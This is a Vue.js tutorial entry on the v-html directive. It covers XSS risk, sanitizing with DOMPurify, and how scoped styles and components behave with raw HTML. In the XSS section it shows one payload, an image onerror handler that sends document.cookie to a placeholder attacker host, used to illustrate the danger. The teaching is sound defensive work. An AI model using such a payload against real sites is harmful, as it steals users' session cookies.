---
order: 15
title: "How do you inject raw HTML in Vue and why is it dangerous?"
difficulty: "beginner"
tags: ["directives", "security"]
summary: "v-html renders raw HTML via innerHTML. Never use it with user input — it enables XSS attacks. Only use with trusted, sanitized content."
---

The `v-html` directive renders a string as raw HTML instead of plain text. It bypasses Vue's template compilation and inserts the HTML directly into the DOM using `innerHTML`. This is useful for rendering trusted rich content (markdown output, CMS content from your own system), but it opens the door to Cross-Site Scripting (XSS) if the content comes from user input.

## Basic usage

```vue
<script setup>
const richContent = ref('<p>Hello <strong>world</strong></p>')
</script>

<template>
  <!-- Renders as styled HTML -->
  <div v-html="richContent" />

  <!-- Compare with text interpolation -->
  <div>{{ richContent }}</div>
  <!-- Shows: <p>Hello <strong>world</strong></p> as plain text -->
</template>
```

Double curly braces `{{ }}` escape HTML entities automatically. `v-html` does not.

## The XSS danger

```vue
<script setup>
// Imagine this comes from a comment form, URL parameter, or database
const userComment = ref(
  'Nice post! <img src="x" onerror="document.location=\'https://evil.com/steal?cookie=\'+document.cookie">'
)
</script>

<template>
  <!-- This executes the attacker's JavaScript -->
  <div v-html="userComment" />
</template>
```

The `onerror` handler runs as soon as the browser tries to load the broken image. The attacker now has the user's cookies. Other attack vectors include `<script>` tags (though `innerHTML` doesn't execute them), `<iframe>`, `<svg onload>`, and event handlers on any element.

## When v-html is safe

The content must come from a source you fully control:

```vue
<script setup>
import { marked } from 'marked'

// Content written by YOUR team, stored in YOUR CMS
const markdownSource = '## Title\n\nSome **bold** text'
const rendered = computed(() => marked(markdownSource))
</script>

<template>
  <article v-html="rendered" />
</template>
```

Even with trusted content, sanitize as an extra layer of defense.

## Sanitizing HTML

If you must render user-provided HTML, sanitize it first with a library like DOMPurify:

```bash
npm install dompurify
```

```vue
<script setup>
import DOMPurify from 'dompurify'

const userContent = ref('<p>Hello</p><script>alert("xss")<\/script>')

const safeHtml = computed(() => DOMPurify.sanitize(userContent.value))
</script>

<template>
  <!-- Script tag is stripped, only <p>Hello</p> remains -->
  <div v-html="safeHtml" />
</template>
```

DOMPurify strips dangerous tags and attributes while keeping safe formatting elements like `<p>`, `<strong>`, `<em>`, `<a>` (with sanitized `href`), and `<img>` (without event handlers).

## v-html limitations

Vue does not process the injected HTML:

```vue
<script setup>
const html = ref('<my-component>Hello</my-component>')
</script>

<template>
  <!-- my-component will NOT be mounted as a Vue component -->
  <div v-html="html" />
</template>
```

Content injected with `v-html` is raw DOM. Vue components, directives (`v-if`, `v-for`), and template syntax (`{{ }}`) inside it are ignored. If you need dynamic templates, use render functions or the runtime compiler.

## Scoped styles don't apply

```vue
<style scoped>
p { color: red; }
</style>

<template>
  <!-- The <p> inside v-html won't be red -->
  <div v-html="'<p>Not styled</p>'" />
</template>
```

Scoped styles add a `data-v-xxxxx` attribute to elements compiled by Vue. Elements injected by `v-html` don't get that attribute, so scoped selectors don't match. Use `:deep()` to target them:

```vue
<style scoped>
div :deep(p) { color: red; }
</style>
```

## Alternatives to v-html

| Need | Approach |
|---|---|
| Display user text safely | `{{ text }}` (auto-escaped) |
| Render markdown | Compile to HTML + DOMPurify + `v-html` |
| Rich text from your CMS | `v-html` (trusted source) |
| User-generated rich text | DOMPurify + `v-html` |
| Dynamic Vue templates | Render functions or runtime compiler |

See also: [What are event modifiers?](/q/event-modifier-order) · [How would you implement global error handling?](/q/global-error-handling) · [What is the Virtual DOM?](/q/virtual-dom)

## References

- [v-html](https://vuejs.org/api/built-in-directives.html#v-html) - Vue.js docs
- [Security](https://vuejs.org/guide/best-practices/security.html) - Vue.js docs
- [DOMPurify](https://github.com/cure53/DOMPurify) - GitHub
